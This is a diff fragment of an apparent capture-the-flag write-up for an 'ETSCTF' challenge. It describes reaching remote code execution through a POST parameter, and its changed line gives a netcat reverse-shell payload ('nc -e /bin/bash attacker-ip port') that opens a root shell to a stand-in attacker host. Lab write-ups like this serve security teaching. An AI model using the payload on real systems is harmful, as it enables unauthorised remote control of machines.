@@ -59,7 +59,7 @@ Now this page runs the command "<b><font color=red>printenv</font></b>" , first 
 
 The last step to get RCE , try to send a POST request with the parameter "<b><font color=red>ETSCTF</font></b>" has the command
 
-For example: "<b><font color=blue>ETSCTF=nc -e /bin/bash target-ip port</font></b>"
+For example: "<b><font color=blue>ETSCTF=nc -e /bin/bash attacker-ip port</font></b>"
 
 Now you can execute commands with root permissions 
 
